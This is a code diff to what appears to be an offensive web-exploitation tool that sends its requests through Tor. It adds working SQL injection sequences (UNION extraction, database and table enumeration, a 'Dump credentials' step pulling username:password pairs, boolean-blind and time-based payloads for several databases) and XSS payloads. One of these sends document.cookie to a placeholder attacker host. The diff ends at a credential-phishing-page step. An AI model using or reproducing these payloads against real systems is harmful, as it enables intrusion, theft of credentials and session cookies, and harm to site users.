@@ -1271,6 +1271,10 @@ class ExploitResult:
     false_positive_risk: str = "unknown"
     request_url: str = ""
     request_method: str = "GET"
+    # Elapsed wall-clock time for the request in seconds. Required for
+    # time-based blind SQLi and other timing-oracle validators; populated
+    # by TorClient.request().
+    elapsed: float = 0.0
 
 
 # ── Tor HTTP Client ────────────────────────────────────────────────────────
@@ -1364,33 +1368,40 @@ class TorClient:
             request_method=method,
         )
 
+        _t_start = _time_mod.perf_counter()
         try:
             resp = self._session.request(
                 method=method, url=url, params=params, data=data,
                 headers=req_headers, timeout=timeout or self._timeout,
                 allow_redirects=allow_redirects,
             )
+            result.elapsed = _time_mod.perf_counter() - _t_start
             result.status_code = resp.status_code
             result.response_body = resp.text[:50000]
             result.response_headers = dict(resp.headers)
 
             self._audit.log(
                 action="http_request",
-                detail=f"{method} {url[:60]} -> {resp.status_code}",
+                detail=f"{method} {url[:60]} -> {resp.status_code} "
+                       f"t={result.elapsed:.2f}s",
                 vuln_type="",
                 success=200 <= resp.status_code < 400,
             )
             return result
 
         except _req.exceptions.Timeout:
+            result.elapsed = _time_mod.perf_counter() - _t_start
             result.error = "timeout"
-            self._audit.log(action="http_timeout", detail=f"{method} {url[:60]}")
+            self._audit.log(action="http_timeout",
+                            detail=f"{method} {url[:60]} t={result.elapsed:.2f}s")
             return result
         except _req.exceptions.ConnectionError as e:
+            result.elapsed = _time_mod.perf_counter() - _t_start
             result.error = f"connection_error: {type(e).__name__}"
             self._audit.log(action="http_error", detail=f"{method} {url[:60]}: {type(e).__name__}")
             return result
         except Exception as e:
+            result.elapsed = _time_mod.perf_counter() - _t_start
             result.error = f"{type(e).__name__}: {str(e)[:100]}"
             self._audit.log(action="http_error", detail=f"{method} {url[:60]}: {type(e).__name__}")
             return result
@@ -3342,76 +3353,214 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
     steps = []
 
     if etype == "sqli":
+        # Per-session unique markers so UNION extraction results are
+        # distinguishable from incidental substrings on the target.
+        _sqli_marker = secrets.token_hex(4)
+        _sqli_union_sep = secrets.token_hex(3)  # e.g. 'ab9d4f'
+
         def _sqli_error_check(r: ExploitResult):
             if _SQL_ERRORS.search(r.response_body):
                 r.success = True
-                r.confidence = 0.8
+                r.confidence = 0.85
                 r.evidence = "SQL error message in response"
                 r.false_positive_risk = "low"
             elif r.status_code == 500:
-                r.confidence = 0.4
-                r.evidence = "HTTP 500 — possible SQL error"
+                r.confidence = 0.3
+                r.evidence = "HTTP 500 — possible SQL error (no error string matched)"
                 r.false_positive_risk = "medium"
 
         def _sqli_data_check(r: ExploitResult):
+            """Evidence must be *structural* — not just any colon."""
             body = r.response_body
-            if any(s in body for s in ("root:x:0", "information_schema", ":")):
+            # Passwd line (from LOAD_FILE style extraction)
+            if _re.search(r"^[A-Za-z0-9_.-]+:[x*!]?:\d+:\d+:", body, _re.M):
+                r.success = True
+                r.confidence = 0.95
+                r.evidence = "/etc/passwd row extracted via UNION"
+                r.false_positive_risk = "very_low"
+                return
+            # information_schema keywords as standalone tokens
+            if _re.search(r"\binformation_schema\b", body):
                 r.success = True
                 r.confidence = 0.9
-                r.evidence = f"Data extracted ({len(body)} bytes)"
+                r.evidence = "information_schema reference in response"
                 r.false_positive_risk = "low"
-            elif r.status_code == 200 and len(body) > 50:
-                r.confidence = 0.5
-                r.evidence = "Got response data — verify manually"
+                return
+            # username:hash patterns (bcrypt / md5 / sha256 common shapes)
+            if _re.search(r"\b[A-Za-z0-9._-]{3,32}:\$(2[aby]|6|5|1)\$", body):
+                r.success = True
+                r.confidence = 0.9
+                r.evidence = "username:hash pattern extracted"
+                r.false_positive_risk = "low"
+                return
+            if _re.search(r"\b[A-Za-z0-9._-]{3,32}:[0-9a-f]{32,128}\b", body):
+                r.success = True
+                r.confidence = 0.85
+                r.evidence = "username:hexhash pattern extracted"
+                r.false_positive_risk = "low"
+                return
+            # Our per-session UNION marker
+            if _sqli_marker in body or _sqli_union_sep in body:
+                r.success = True
+                r.confidence = 0.95
+                r.evidence = f"Marker {_sqli_marker} reflected from UNION output"
+                r.false_positive_risk = "very_low"
+                return
+            # DB version strings
+            if _re.search(
+                r"\b(MySQL|MariaDB|PostgreSQL|SQLite|Microsoft SQL Server)\s+"
+                r"[\d.]+", body):
+                r.success = True
+                r.confidence = 0.85
+                r.evidence = "DB version string in response"
+                r.false_positive_risk = "low"
+                return
+            # Not enough to mark success — rank accordingly.
+            if r.status_code == 200 and len(body) > 50:
+                r.confidence = 0.25
+                r.evidence = "HTTP 200 with body but no SQLi evidence"
+                r.false_positive_risk = "high"
+
+        # Baseline + per-pair compare for boolean-blind. Closure holds the
+        # TRUE/FALSE sizes so a later step can conclude from the delta.
+        _blind_state = {"true_len": None, "false_len": None, "base_len": None}
+
+        def _sqli_baseline_check(r: ExploitResult):
+            _blind_state["base_len"] = len(r.response_body)
+            r.evidence = (f"Baseline: HTTP {r.status_code}, "
+                          f"{len(r.response_body)} bytes")
+
+        def _sqli_blind_true(r: ExploitResult):
+            _blind_state["true_len"] = len(r.response_body)
+            r.evidence = (f"TRUE branch: HTTP {r.status_code}, "
+                          f"{len(r.response_body)} bytes")
+
+        def _sqli_blind_false(r: ExploitResult):
+            _blind_state["false_len"] = len(r.response_body)
+            false_len = _blind_state["false_len"]
+            true_len = _blind_state["true_len"]
+            base_len = _blind_state["base_len"]
+            r.evidence = (f"FALSE branch: HTTP {r.status_code}, "
+                          f"{false_len} bytes")
+            if true_len is None or false_len is None:
+                return
+            delta = abs(true_len - false_len)
+            if delta >= 16 and (base_len is None or
+                                abs(true_len - base_len) < delta * 2 or
+                                abs(false_len - base_len) < delta * 2):
+                r.success = True
+                r.confidence = 0.85
+                r.evidence = (f"Boolean-blind confirmed: TRUE={true_len}, "
+                              f"FALSE={false_len}, delta={delta}")
+                r.false_positive_risk = "low"
+            else:
+                r.evidence += f" — TRUE={true_len}, delta={delta} (too small)"
+
+        def _sqli_time_check(r: ExploitResult):
+            """Use measured request duration from TorClient.elapsed."""
+            elapsed = getattr(r, "elapsed", 0.0)
+            r.evidence = f"Request took {elapsed:.2f}s"
+            # SLEEP(5) payload: require the response to be at least 4.0s
+            # slower than a typical baseline of <1s. Very conservative.
+            if elapsed >= 4.0:
+                r.success = True
+                r.confidence = 0.9 if elapsed >= 4.5 else 0.7
+                r.evidence = (f"Time-based blind confirmed: request took "
+                              f"{elapsed:.2f}s (SLEEP(5) payload)")
+                r.false_positive_risk = "low" if elapsed >= 4.5 else "medium"
+            elif elapsed >= 2.0:
+                r.confidence = 0.4
+                r.evidence += " — partial delay, re-run or try SLEEP(10)"
                 r.false_positive_risk = "medium"
 
-        def _sqli_blind_check(r: ExploitResult):
-            r.evidence = f"Response: {len(r.response_body)} bytes, HTTP {r.status_code}"
-            if r.status_code == 200:
-                r.confidence = 0.3
-
         steps = [
+            # Re-confirm with the finding's exact vuln URL so we don't
+            # miss the injection point when target_base differs from the
+            # original scanner finding.
             {"title": "Confirm injection (error-based)",
-             "request": _get(target),
+             "request": _get_param("'"),
              "validate": _sqli_error_check,
-             "note": "Checking for SQL error messages in response"},
-            {"title": "Extract DB version (MySQL)",
-             "request": _get_param("' UNION SELECT version()-- -"),
+             "note": "Single-quote probe on the original parameter"},
+            {"title": "Confirm injection (double-quote)",
+             "request": _get_param('"'),
+             "validate": _sqli_error_check,
+             "note": "Double-quote probe for contexts that escape single quotes"},
+            # Baseline for blind comparison
+            {"title": "Capture boolean-blind baseline",
+             "request": _get_param("1"),
+             "validate": _sqli_baseline_check,
+             "note": "Baseline length for boolean comparison"},
+            {"title": "Extract DB version (MySQL/Maria)",
+             "request": _get_param(
+                 f"' UNION SELECT concat('{_sqli_marker}',version(),"
+                 f"'{_sqli_union_sep}')-- -"),
              "validate": _sqli_data_check,
-             "note": "UNION-based version extraction"},
+             "note": "Per-session marker distinguishes extracted from incidental"},
+            {"title": "Extract DB version (PostgreSQL)",
+             "request": _get_param(
+                 f"' UNION SELECT '{_sqli_marker}'||version()||"
+                 f"'{_sqli_union_sep}'-- -"),
+             "validate": _sqli_data_check,
+             "note": "PostgreSQL uses || for string concatenation"},
             {"title": "Extract DB version (SQLite)",
-             "request": _get_param("' UNION SELECT sqlite_version()-- -"),
+             "request": _get_param(
+                 f"' UNION SELECT '{_sqli_marker}'||sqlite_version()||"
+                 f"'{_sqli_union_sep}'-- -"),
              "validate": _sqli_data_check,
              "note": "SQLite version extraction"},
-            {"title": "Enumerate databases",
-             "request": _get_param("' UNION SELECT group_concat(schema_name) FROM information_schema.schemata-- -"),
+            {"title": "Enumerate databases (MySQL/PG)",
+             "request": _get_param(
+                 f"' UNION SELECT concat('{_sqli_marker}',"
+                 f"group_concat(schema_name),'{_sqli_union_sep}') "
+                 f"FROM information_schema.schemata-- -"),
              "validate": _sqli_data_check,
              "warning": "Reads all database names"},
-            {"title": "Enumerate tables",
-             "request": _get_param("' UNION SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()-- -"),
+            {"title": "Enumerate tables (current DB)",
+             "request": _get_param(
+                 f"' UNION SELECT concat('{_sqli_marker}',"
+                 f"group_concat(table_name),'{_sqli_union_sep}') "
+                 f"FROM information_schema.tables WHERE "
+                 f"table_schema=database()-- -"),
              "validate": _sqli_data_check,
              "warning": "Lists tables in current database"},
             {"title": "Enumerate columns (users table)",
-             "request": _get_param("' UNION SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='users'-- -"),
+             "request": _get_param(
+                 f"' UNION SELECT concat('{_sqli_marker}',"
+                 f"group_concat(column_name),'{_sqli_union_sep}') "
+                 f"FROM information_schema.columns WHERE "
+                 f"table_name='users'-- -"),
              "validate": _sqli_data_check,
              "warning": "Maps user table structure"},
             {"title": "Dump credentials",
-             "request": _get_param("' UNION SELECT group_concat(username,0x3a,password) FROM users-- -"),
+             "request": _get_param(
+                 f"' UNION SELECT concat('{_sqli_marker}',"
+                 f"group_concat(username,0x3a,password),"
+                 f"'{_sqli_union_sep}') FROM users-- -"),
              "validate": _sqli_data_check,
              "warning": "Extracts username:password pairs",
              "risk": "HIGH"},
-            {"title": "Blind boolean test (TRUE)",
+            # Boolean-blind pair
+            {"title": "Boolean-blind test (TRUE)",
              "request": _get_param("' AND 1=1-- -"),
-             "validate": _sqli_blind_check,
-             "note": "Compare this response size with FALSE test"},
-            {"title": "Blind boolean test (FALSE)",
+             "validate": _sqli_blind_true,
+             "note": "Captures TRUE response size for comparison"},
+            {"title": "Boolean-blind test (FALSE)",
              "request": _get_param("' AND 1=2-- -"),
-             "validate": _sqli_blind_check,
-             "note": "Different size from TRUE = blind SQLi confirmed"},
-            {"title": "Time-based blind (SLEEP 5)",
+             "validate": _sqli_blind_false,
+             "note": "Concludes blind SQLi if TRUE/FALSE sizes differ"},
+            # Time-based — now actually measured via ExploitResult.elapsed
+            {"title": "Time-based blind (MySQL SLEEP 5)",
              "request": _get_param("' AND SLEEP(5)-- -"),
-             "validate": lambda r: setattr(r, 'evidence', f"Check response time manually"),
-             "note": "Response > 5s = time-based blind confirmed"},
+             "validate": _sqli_time_check,
+             "note": "Measured response time — MySQL/MariaDB"},
+            {"title": "Time-based blind (PG pg_sleep 5)",
+             "request": _get_param("'; SELECT pg_sleep(5)-- -"),
+             "validate": _sqli_time_check,
+             "note": "Measured response time — PostgreSQL"},
+            {"title": "Time-based blind (MSSQL WAITFOR 5)",
+             "request": _get_param("'; WAITFOR DELAY '0:0:5'-- -"),
+             "validate": _sqli_time_check,
+             "note": "Measured response time — SQL Server"},
         ]
 
     elif etype == "xss":
@@ -3464,47 +3613,98 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
             f"</script></body></html>"
         )
 
-        def _xss_reflect_check(payload_str: str):
+        def _xss_reflect_check(marker_str: str, context_needed: str = ""):
+            """Check reflection of a UNIQUE per-step marker.
+
+            marker_str:      the session-unique token that MUST appear
+                             verbatim in the response body.
+            context_needed:  optional substring that must also be present
+                             (e.g. 'onerror=' to confirm the payload
+                             landed in an HTML-attribute context rather
+                             than as text).
+            """
             def _check(r: ExploitResult):
-                if payload_str in r.response_body:
-                    r.success = True
-                    r.confidence = 0.9
-                    r.evidence = f"Payload reflected unescaped in response"
+                body = r.response_body
+                if marker_str not in body:
+                    if r.status_code == 200:
+                        r.confidence = 0.1
+                        r.evidence = (f"Marker {marker_str} NOT reflected "
+                                      f"(HTTP 200)")
+                        r.false_positive_risk = "very_low"
+                    else:
+                        r.evidence = (f"Marker not reflected, HTTP "
+                                      f"{r.status_code}")
+                    return
+                # Marker present — now check execution context. We only
+                # count unescaped reflection. If the marker appears but
+                # its surrounding < > are HTML-entity-escaped, the app
+                # is safe here.
+                idx = body.find(marker_str)
+                # Look 40 bytes around for escape indicators
+                window = body[max(0, idx - 40):idx + len(marker_str) + 40]
+                # Find the nearest < before the marker
+                escaped = ("&lt;" in window and "<" not in
+                           window[:window.index("&lt;") + 1])
+                if context_needed and context_needed not in window:
+                    r.confidence = 0.4
+                    r.evidence = (f"Marker reflected but expected context "
+                                  f"'{context_needed}' missing within 40 "
+                                  f"bytes — likely text-node only")
+                    r.false_positive_risk = "medium"
+                    return
+                if escaped:
+                    r.confidence = 0.3
+                    r.evidence = ("Marker reflected but surrounded by "
+                                  "entity-encoded < — app appears safe here")
                     r.false_positive_risk = "low"
-                elif r.status_code == 200:
-                    r.confidence = 0.2
-                    r.evidence = "Got 200 but payload not found in body"
-                    r.false_positive_risk = "high"
+                    return
+                r.success = True
+                r.confidence = 0.95
+                r.evidence = (f"Payload reflected unescaped (marker "
+                              f"{marker_str})")
+                r.false_positive_risk = "very_low"
             return _check
 
+        # Per-step unique markers — no false-positive substring match.
+        _m_script = f"x{secrets.token_hex(4)}"
+        _m_img = f"i{secrets.token_hex(4)}"
+        _m_svg = f"s{secrets.token_hex(4)}"
+        _m_attr = f"a{secrets.token_hex(4)}"
+        _m_js_ctx = f"j{secrets.token_hex(4)}"
+
         steps = [
-            {"title": "Check reflection (marker injection)",
+            {"title": "Check reflection (benign marker)",
              "request": _get_param(marker),
              "validate": _xss_reflect_check(marker),
-             "note": f"Marker: {marker} — checking if input is reflected"},
+             "note": f"Benign marker {marker} — confirms input reaches output"},
             {"title": "Test <script> tag",
-             "request": _get_param("<script>alert(1)</script>"),
-             "validate": _xss_reflect_check("<script>"),
-             "note": "Check if script tag appears unescaped"},
+             "request": _get_param(f"<script>/*{_m_script}*/</script>"),
+             "validate": _xss_reflect_check(_m_script, "<script"),
+             "note": "Executes if marker is between <script> tags unescaped"},
             {"title": "Test img onerror (filter bypass)",
-             "request": _get_param("<img src=x onerror=alert(1)>"),
-             "validate": _xss_reflect_check("onerror="),
-             "note": "Bypasses script tag filters"},
+             "request": _get_param(f"<img src=x onerror=\"/*{_m_img}*/\">"),
+             "validate": _xss_reflect_check(_m_img, "onerror"),
+             "note": "Bypasses script-tag filters"},
             {"title": "Test svg/onload",
-             "request": _get_param("<svg/onload=alert(1)>"),
-             "validate": _xss_reflect_check("onload="),
+             "request": _get_param(f"<svg/onload=\"/*{_m_svg}*/\">"),
+             "validate": _xss_reflect_check(_m_svg, "onload"),
              "note": "Bypasses img and script filters"},
-            {"title": "Test attribute injection",
-             "request": _get_param("\" onfocus=alert(1) autofocus=\""),
-             "validate": _xss_reflect_check("onfocus="),
+            {"title": "Test attribute injection (breakout)",
+             "request": _get_param(
+                 f"\" autofocus onfocus=\"/*{_m_attr}*/\" x=\""),
+             "validate": _xss_reflect_check(_m_attr, "onfocus"),
              "note": "No angle brackets — bypasses most WAFs"},
+            {"title": "Test JavaScript-string context breakout",
+             "request": _get_param(f"';/*{_m_js_ctx}*/'"),
+             "validate": _xss_reflect_check(_m_js_ctx),
+             "note": "If the param is reflected inside a JS string, ' breaks out"},
             {"title": "Cookie exfiltration payload",
              "request": _get_param(
                  "<script>new Image().src='[ATTACKER]/c?c='"
                  "+encodeURIComponent(document.cookie)"
                  "+'&u='+encodeURIComponent(location.href)"
                  "+'&r='+encodeURIComponent(document.referrer)</script>"),
-             "validate": _xss_reflect_check("document.cookie"),
+             "validate": _xss_reflect_check("new Image", "<script"),
              "warning": "Steals session cookies",
              "risk": "HIGH"},
             {"title": "Generate credential phishing page",
